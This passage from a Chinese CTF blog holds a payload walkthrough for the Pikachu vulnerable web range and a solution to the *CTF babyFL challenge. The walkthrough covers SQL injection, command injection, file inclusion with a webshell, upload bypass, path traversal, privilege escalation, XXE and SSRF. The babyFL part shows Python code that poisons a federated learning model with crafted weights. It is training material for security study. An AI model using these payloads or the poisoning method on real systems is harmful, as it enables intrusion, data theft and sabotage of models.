1</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/e6lwziJvnFQqxbo.png" alt="sql_post.png"></p><h3 id="字符型注入（get）"><a href="#字符型注入（get）" class="headerlink" title="字符型注入（get）"></a>字符型注入（get）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; or 1=1#</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; or 1=1-- </span><br></pre></td></tr></table></figure><p>注意第二个payload最后有个空格</p><h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e%&#x27; or 1=1#</span><br></pre></td></tr></table></figure><h3 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e&#x27;) or 1=1#</span><br></pre></td></tr></table></figure><h3 id="“insert-x2F-update”注入"><a href="#“insert-x2F-update”注入" class="headerlink" title="“insert&#x2F;update”注入"></a>“insert&#x2F;update”注入</h3><blockquote><p>基于报错的注入可利用的3个函数：</p><ul><li>updatexml()</li><li>extractvalue()</li><li>floor()</li></ul></blockquote><h4 id="insert（注册）"><a href="#insert（注册）" class="headerlink" title="insert（注册）"></a>insert（注册）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evolution&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure><h4 id="update（修改）"><a href="#update（修改）" class="headerlink" title="update（修改）"></a>update（修改）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evolution&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure><h3 id="“delete”注入"><a href="#“delete”注入" class="headerlink" title="“delete”注入"></a>“delete”注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 or updatexml(1,concat(0x7e,database()),0)</span><br></pre></td></tr></table></figure><p>payload需要使用url编码一下</p><p><img src="https://s2.loli.net/2022/04/21/otBxdq4lAe7hgw5.png" alt="sql_delete.png"></p><h3 id="“httpheader”注入"><a href="#“httpheader”注入" class="headerlink" title="“httpheader”注入"></a>“httpheader”注入</h3><h4 id="修改user-agent"><a href="#修改user-agent" class="headerlink" title="修改user-agent"></a>修改user-agent</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evolution&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/UZHLIDRql5PCo4O.png" alt="sql_useragent.png"></p><h4 id="修改cookie"><a href="#修改cookie" class="headerlink" title="修改cookie"></a>修改cookie</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evolution&#x27; and updatexml(1,concat(0x7e,database()),0)#</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/chIJ62TEu4ziW3w.png" alt="sql_cookie.png"></p><h3 id="盲注（based-on-boolian）"><a href="#盲注（based-on-boolian）" class="headerlink" title="盲注（based on boolian）"></a>盲注（based on boolian）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and ascii(substr(database(),1,1))=112#</span><br></pre></td></tr></table></figure><h3 id="盲注（based-on-time）"><a href="#盲注（based-on-time）" class="headerlink" title="盲注（based on time）"></a>盲注（based on time）</h3><p>尝试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and sleep(5)#</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/QN9yJxcgIF6P1AS.png" alt="sql_time.png"></p><p>发现存在注入点，输入payload进行盲注</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and if((substr(database(),1,1))=&#x27;p&#x27;,sleep(5),null)#</span><br></pre></td></tr></table></figure><p>若延迟时间有5s则database第一个字符为p，否则字符不对应。</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe%df&#x27; or 1=1#</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/aAp3moSsrUJYe7M.png" alt="sql_widebyte.png"></p><blockquote><h4 id="除了上述各种手动注入方法，读者也可以选择使用sqlmap工具进行注入。"><a href="#除了上述各种手动注入方法，读者也可以选择使用sqlmap工具进行注入。" class="headerlink" title="除了上述各种手动注入方法，读者也可以选择使用sqlmap工具进行注入。"></a>除了上述各种手动注入方法，读者也可以选择使用sqlmap工具进行注入。</h4></blockquote><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="exec（ping）"><a href="#exec（ping）" class="headerlink" title="exec（ping）"></a>exec（ping）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp; ipconfig</span><br></pre></td></tr></table></figure><h3 id="exec（eval）"><a href="#exec（eval）" class="headerlink" title="exec（eval）"></a>exec（eval）</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><h3 id="File-Inclusion-local"><a href="#File-Inclusion-local" class="headerlink" title="File Inclusion(local)"></a>File Inclusion(local)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/fileinclude/fi_local.php?filename=../../../test/phpinfo.txt&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><h3 id="File-Inclusion-remote"><a href="#File-Inclusion-remote" class="headerlink" title="File Inclusion(remote)"></a>File Inclusion(remote)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/fileinclude/fi_remote.php?filename=http://127.0.0.1:8081/pikachu/test/yijuhua.txt&amp;submit=提交查询</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/fileinclude/yijuhua.php?x=ipconfig</span><br></pre></td></tr></table></figure><h2 id="unsafe-filedownload"><a href="#unsafe-filedownload" class="headerlink" title="unsafe filedownload"></a>unsafe filedownload</h2><h3 id="unsafe-filedownload-1"><a href="#unsafe-filedownload-1" class="headerlink" title="unsafe filedownload"></a>unsafe filedownload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/unsafedownload/execdownload.php?filename=../../../wiki/image/title.png</span><br></pre></td></tr></table></figure><h2 id="unsafe-fileupload"><a href="#unsafe-fileupload" class="headerlink" title="unsafe fileupload"></a>unsafe fileupload</h2><h3 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h3><p>前端限制，删除检查函数即可</p><p><img src="https://s2.loli.net/2022/04/21/rLMYNFlORvZIS7h.png" alt="upload_client.png"></p><h3 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h3><p>修改post请求的Content-Type字段即可</p><p><img src="https://s2.loli.net/2022/04/21/A8xYrzsbKuJPl7F.png" alt="upload_MIME.png"></p><h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h3><p>创建文件phpinfo.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>创建新图片</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy /b ai.png + phpinfo.php ccc.png</span><br></pre></td></tr></table></figure><p>上传文件后，获得文件保存位置，构造url访问即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2022/04/21/69033462610e99ca1b5084426014.png&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><h2 id="over-permission"><a href="#over-permission" class="headerlink" title="over permission"></a>over permission</h2><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>登陆后修改username即可查看任意用户信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/overpermission/op1/op1_mem.php?username=lili&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>登录admin用户创建新用户，然后退出，burp抓取此次操作并放入repeater模块。</p><p>登录普通用户，通过burp获取cookie</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=e6e5csjr6mdrmnuappdgi1c0qb</span><br></pre></td></tr></table></figure><p>将admin用户cookie替换为普通用户cookie并重新提交请求</p><p><img src="https://s2.loli.net/2022/04/21/4iRqaw9ZCJBeQzg.png" alt="overpermission_1.png"></p><p>可以看到，我们以普通用户身份使用admin用户权限添加了一个新用户</p><p><img src="https://s2.loli.net/2022/04/21/QeqwtoVcjYCk3OK.png" alt="overpermission_2.png"></p><h2 id="x2F-x2F"><a href="#x2F-x2F" class="headerlink" title="..&#x2F;..&#x2F;"></a>..&#x2F;..&#x2F;</h2><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/dir/dir_list.php?title=../dir.php</span><br></pre></td></tr></table></figure><h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><h3 id="IcanseeyourABC"><a href="#IcanseeyourABC" class="headerlink" title="IcanseeyourABC"></a>IcanseeyourABC</h3><p>直接查看源代码：</p><p><img src="https://s2.loli.net/2022/04/21/uq2pokJCiWRdlch.png" alt="info_1.png"></p><p>直接输入payload亦可：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/infoleak/abc.php</span><br></pre></td></tr></table></figure><h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><h3 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h3><p>使用文件ser.php获取payload，代码如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;evolution&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到payload为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">35</span>:<span class="string">&quot;&lt;script&gt;alert(&#x27;evolution&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY hacker &quot;evolution&quot;&gt; ]&gt; &lt;name&gt;&amp;hacker;&lt;/name&gt;</span><br></pre></td></tr></table></figure><h2 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h2><h3 id="不安全的URL跳转"><a href="#不安全的URL跳转" class="headerlink" title="不安全的URL跳转"></a>不安全的URL跳转</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/urlredirect/urlredirect.php?url=https://www.baidu.com/</span><br></pre></td></tr></table></figure><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>若点击后无诗句显示，可以查看是否链接地址是否写了自己的端口号。</p><h3 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/ssrf/ssrf_curl.php?url=https://www.baidu.com</span><br></pre></td></tr></table></figure><h3 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=ssrf.php</span><br></pre></td></tr></table></figure><p>获得结果再用base64解密即可</p>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> pikachu靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022StarCTF-Misc-babyFL</title>
      <link href="/2022/04/20/2022StarCTF-Misc-babyFL/"/>
      <url>/2022/04/20/2022StarCTF-Misc-babyFL/</url>
      
        <content type="html"><![CDATA[<h1 id="2022-CTF-Misc-babyFL-WP（AI安全）"><a href="#2022-CTF-Misc-babyFL-WP（AI安全）" class="headerlink" title="2022 *CTF Misc babyFL WP（AI安全）"></a>2022 *CTF Misc babyFL WP（AI安全）</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><p><img src="https://s2.loli.net/2022/04/20/qLvKly2XEbeofHA.png" alt="1.png"></p><blockquote><p><strong>源码链接：</strong></p><p>链接：<a href="https://pan.baidu.com/s/14eOkeEAxO5byopzZhgyh8A">https://pan.baidu.com/s/14eOkeEAxO5byopzZhgyh8A</a><br>提取码：pl5w </p></blockquote><p><strong>推荐使用jupyter</strong></p><h2 id="题目分析："><a href="#题目分析：" class="headerlink" title="题目分析："></a>题目分析：</h2><p>先看源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;/home/ctf/model&#x27;</span>):</span><br><span class="line">            os.mkdir(<span class="string">&quot;/home/ctf/model&quot;</span>)</span><br><span class="line">            train_models() <span class="comment">#训练模型</span></span><br><span class="line">        parameters = load_parameters() <span class="comment">#加载正确识别的模型的参数</span></span><br><span class="line">        parameters = get_input_parameter(parameters) <span class="comment">#添加自己输入的权重</span></span><br><span class="line">        model = aggregation(parameters) <span class="comment">#用更新后的权重组合更新模型</span></span><br><span class="line">        test(model) <span class="comment">#测试模型，错误识别数字的正确率高于95%即可获取flag</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        traceback.print_exc()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>)</span><br></pre></td></tr></table></figure><p>分析可知，需要自己输入一组参数来使得acc&gt;0.95来获取flag。</p><p><img src="https://s2.loli.net/2022/04/20/BI6W8g4DruHeXA3.png" alt="2.png"></p><p>观察load_test_data函数可知，测试所用的数据是错误的，与正确识别的数字标签相反（0被错误识别为9），故整体思路为，分别训练正确识别和错误识别两个模型，然后用<code>21*错误模型参数权重-n*正确模型参数权重=要输入的参数权重</code>获取输入参数并保存。(n取0-4中的数即可)</p><h2 id="题目解答："><a href="#题目解答：" class="headerlink" title="题目解答："></a>题目解答：</h2><h3 id="训练正确模型："><a href="#训练正确模型：" class="headerlink" title="训练正确模型："></a>训练正确模型：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">train_models_true</span>():</span><br><span class="line">    (x, y), (_, _) = mnist.load_data()</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    model = new_model()</span><br><span class="line">    model.fit(x, y, batch_size=<span class="number">64</span>, epochs=<span class="number">30</span>)</span><br><span class="line">    model.save(<span class="string">&quot;1.h5&quot;</span>)<span class="comment">#正确模型的参数</span></span><br></pre></td></tr></table></figure><h3 id="训练错误模型："><a href="#训练错误模型：" class="headerlink" title="训练错误模型："></a>训练错误模型：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_test_data</span>():</span><br><span class="line">    (x, y), (_, _) = mnist.load_data()</span><br><span class="line">    l = <span class="built_in">len</span>(y)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        y[i] = <span class="number">9</span> - y[i]</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> x, y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">train_models_false</span>():</span><br><span class="line">    x, y = load_test_data()</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    model = new_model()</span><br><span class="line">    model.fit(x, y, batch_size=<span class="number">64</span>, epochs=<span class="number">30</span>)</span><br><span class="line">    model.save(<span class="string">&quot;2.h5&quot;</span>)<span class="comment">#错误模型参数</span></span><br></pre></td></tr></table></figure><h3 id="保存权重："><a href="#保存权重：" class="headerlink" title="保存权重："></a>保存权重：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model1 = load_model(<span class="string">&#x27;2.h5&#x27;</span>)</span><br><span class="line">param2 = model1.get_weights()</span><br><span class="line">model2 = load_model(<span class="string">&#x27;1.h5&#x27;</span>)</span><br><span class="line">param1 = model2.get_weights()</span><br><span class="line">weights = []</span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(param2)):</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="built_in">str</span>(i)+<span class="string">&#x27;.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    layer1 = param1[i]</span><br><span class="line">    layer2 = param2[i]</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="built_in">sum</span> = layer2*<span class="number">21</span>-layer1</span><br><span class="line">    weights.append(<span class="built_in">sum</span>)</span><br><span class="line">    arr = np.array(<span class="built_in">sum</span>, <span class="built_in">float</span>)</span><br><span class="line">    arr = arr.ravel()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr)):</span><br><span class="line">        f.write(<span class="built_in">str</span>(arr[i])+<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h3 id="搭建本地环境并测试："><a href="#搭建本地环境并测试：" class="headerlink" title="搭建本地环境并测试："></a>搭建本地环境并测试：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras.layers <span class="keyword">import</span>  Dense, Conv2D, Flatten, MaxPooling2D</span><br><span class="line"><span class="keyword">from</span> tensorflow <span class="keyword">import</span> keras</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tensorflow.keras.models <span class="keyword">import</span> load_model</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras.datasets <span class="keyword">import</span> mnist</span><br><span class="line"></span><br><span class="line">participant_number = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_model</span>():</span><br><span class="line">    model = Sequential()</span><br><span class="line">    model.add(Conv2D(<span class="number">10</span>, (<span class="number">3</span>, <span class="number">3</span>), input_shape=(<span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)))</span><br><span class="line">    model.add(MaxPooling2D(pool_size=(<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">    model.add(Conv2D(<span class="number">20</span>, (<span class="number">3</span>, <span class="number">3</span>)))</span><br><span class="line">    model.add(Flatten())</span><br><span class="line">    model.add(Dense(units=<span class="number">100</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">    model.add(Dense(units=<span class="number">10</span>, activation=<span class="string">&#x27;softmax&#x27;</span>))</span><br><span class="line">    model.<span class="built_in">compile</span>(loss=keras.losses.SparseCategoricalCrossentropy(), metrics=[<span class="string">&#x27;accuracy&#x27;</span>],</span><br><span class="line">                  optimizer=keras.optimizers.Adam(lr=<span class="number">0.001</span>))</span><br><span class="line">    <span class="keyword">return</span> model</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_test_data</span>():</span><br><span class="line">    (_, _), (x, y) = mnist.load_data()</span><br><span class="line">    l = <span class="built_in">len</span>(y)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        y[i] = <span class="number">9</span> - y[i]</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> x, y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">train_models</span>():</span><br><span class="line">    (x, y), (_, _) = mnist.load_data()</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(participant_number):</span><br><span class="line">        model = new_model()</span><br><span class="line">        model.fit(x, y, batch_size=<span class="number">64</span>, epochs=<span class="number">10</span>)</span><br><span class="line">        model.save(<span class="string">&quot;model/&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aggregation</span>(<span class="params">parameters</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;aggregation&#x27;</span>)</span><br><span class="line">    weights = []</span><br><span class="line">    <span class="keyword">for</span> layer <span class="keyword">in</span> parameters:</span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">        l = <span class="built_in">len</span>(layer)</span><br><span class="line">        <span class="keyword">for</span> temp <span class="keyword">in</span> layer:</span><br><span class="line">            <span class="built_in">sum</span> = <span class="built_in">sum</span> + temp</span><br><span class="line">        weights.append(<span class="built_in">sum</span> / l)</span><br><span class="line">    model = new_model()</span><br><span class="line">    l = <span class="built_in">len</span>(model.get_weights())</span><br><span class="line">    model.set_weights(weights)</span><br><span class="line">    <span class="keyword">return</span> model</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">model</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">    my_x, my_y = load_test_data()</span><br><span class="line">    loss, acc = model.evaluate(my_x, my_y, batch_size=<span class="number">64</span>)</span><br><span class="line">    <span class="keyword">if</span> acc &gt; <span class="number">0.95</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;FLAG GET!!!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you fail&quot;</span>, acc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_parameters</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;load parameter&#x27;</span>)</span><br><span class="line">    parameters = []</span><br><span class="line">    models = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(participant_number):</span><br><span class="line">        models.append(load_model(<span class="string">&quot;model/&quot;</span>+<span class="built_in">str</span>(i)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        layer = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(participant_number):</span><br><span class="line">            temp = models[j].get_weights()</span><br><span class="line">            layer.append(temp[i])</span><br><span class="line">        parameters.append(layer)</span><br><span class="line">    <span class="keyword">return</span> parameters</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_input_parameter_auto</span>(<span class="params">parameters</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;get input parameter&#x27;</span>)</span><br><span class="line">    myid = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> layer <span class="keyword">in</span> parameters:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;next layer:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(layer[<span class="number">0</span>].shape,<span class="string">&quot; &quot;</span>,mylayers[myid].shape)</span><br><span class="line">        input_weight = mylayers[myid]</span><br><span class="line">        myid = myid + <span class="number">1</span></span><br><span class="line">        layer.append(input_weight)</span><br><span class="line">    <span class="keyword">return</span> parameters</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;model&#x27;</span>):</span><br><span class="line">        os.mkdir(<span class="string">&quot;model&quot;</span>)</span><br><span class="line">        train_models()</span><br><span class="line">        </span><br><span class="line">dict_shape = &#123;<span class="number">0</span>:(<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">10</span>), <span class="number">1</span>:(<span class="number">10</span>,), <span class="number">2</span>:(<span class="number">3</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">20</span>), <span class="number">3</span>:(<span class="number">20</span>,), </span><br><span class="line">                  <span class="number">4</span>:(<span class="number">2420</span>, <span class="number">100</span>), <span class="number">5</span>:(<span class="number">100</span>,), <span class="number">6</span>:(<span class="number">100</span>, <span class="number">10</span>), <span class="number">7</span>:(<span class="number">10</span>,)&#125; <span class="comment">#每一层的权重结构</span></span><br><span class="line">mylayers = []</span><br><span class="line"><span class="keyword">for</span> inde <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">f&#x27;<span class="subst">&#123;inde&#125;</span>.txt&#x27;</span>,mode = <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">file = f.readlines()</span><br><span class="line">mylayer = []</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> file:</span><br><span class="line">item = item.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">item = item.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">mylayer.append(item)</span><br><span class="line">mylayer = mylayer[<span class="number">0</span>]</span><br><span class="line">mylayer = mylayer[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mylayer)):</span><br><span class="line">mylayer[i] = <span class="built_in">float</span>(mylayer[i])</span><br><span class="line">pas = []</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dict_shape[inde])):</span><br><span class="line">pas.append(<span class="built_in">int</span>(dict_shape[inde][num]))</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">len</span>(pas)==<span class="number">4</span>):</span><br><span class="line">mylayers.append(np.array(mylayer).reshape(pas[<span 